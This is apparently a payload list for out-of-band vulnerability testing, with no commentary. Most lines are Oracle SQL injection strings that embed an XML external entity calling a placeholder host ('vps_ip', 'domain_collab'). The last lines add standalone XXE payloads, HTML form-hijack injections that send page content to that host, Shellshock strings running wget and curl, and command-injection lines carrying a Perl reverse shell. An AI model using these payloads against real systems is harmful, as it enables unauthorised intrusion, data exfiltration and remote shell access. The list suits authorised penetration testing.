+"||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+') SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+')) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+'||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`)) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+`; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+" OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+' OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+` OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+")) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+')) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`)) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+" AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+' AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+` AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+" OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+") OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+' OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+') OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+` OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+" SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l' FROM dual--
+" AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+") AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+' AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+') AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+` AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+") OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+")) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+') OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+')) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+`) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`)) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+" SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+") SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+"; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+"||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+') SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+'||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+"UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+'UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+`UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l' FROM dual-- 
+") AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+")) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+') AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+')) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+`) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`)) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual--
+OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+")) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+')) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`)) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+") SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+")) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+"; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+"||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+') SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+')) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+'||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`)) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+"UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+'UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+")) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+')) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+`)) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://vps_ip:80/"> %remote;]>'),'/l') FROM dual-- 
+" OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+' OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+")) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+')) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`)) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+" AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+' AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+" OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+") OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+' OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+') OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+" AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+") AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+' AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+') AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+") OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+")) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+') OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+')) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`)) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+"UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+'UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+") AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+")) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+') AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+')) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`)) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+")) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+')) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`)) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+"UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+'UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+")) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+')) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+`)) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE x SYSTEM \"http://xxe-doctype-system.domain_collab/\"\u003e\u003cx /\u003e"
+"><noscript><form action=http://vps_ip:80><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE x PUBLIC \"\" \"http://xxe-doctype-public.domain_collab/\"\u003e\u003cx /\u003e"
+"><noscript><form action=http://domain_collab><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
+\u003c?xml version\u003d\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"http://domain_collab\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e"
+() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://vps_ip:80/.testing/shellshock.txt?vuln=13;curl http://vps_ip:80/.testing/shellshock.txt?vuln=15;\");'
+\u003c?xml version\u003d\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource\u003dhttp://domain_collab\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE x [\u003c!ENTITY % xxe SYSTEM \"http://xxe-paramentity-system.domain_collab/\"\u003e%xxe;]\u003e\u003cx/\u003e"
+() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://domain_collab/.testing/shellshock.txt?vuln=13;curl http://domain_collab/.testing/shellshock.txt?vuln=15;\");'
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE x [\u003c!ENTITY % xxe PUBLIC \"\" \"http://xxe-paramentity-public.domain_collab/\"\u003e%xxe;]\u003e\u003cx/\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"http://domain_collab\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE x [\u003c!ENTITY xxe SYSTEM \"http://xxe-entity-system.domain_collab/\"\u003e]\u003e\u003cx\u003e\u0026xxe;\u003c/x\u003e"
+echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > vps_ip:80
+& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > vps_ip:80
+; echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > vps_ip:80
+| echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > vps_ip:80
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE x [\u003c!ENTITY xxe PUBLIC \"\" \"http://xxe-entity-public.domain_collab/\"\u003e]\u003e\u003cx\u003e\u0026xxe;\u003c/x\u003e"
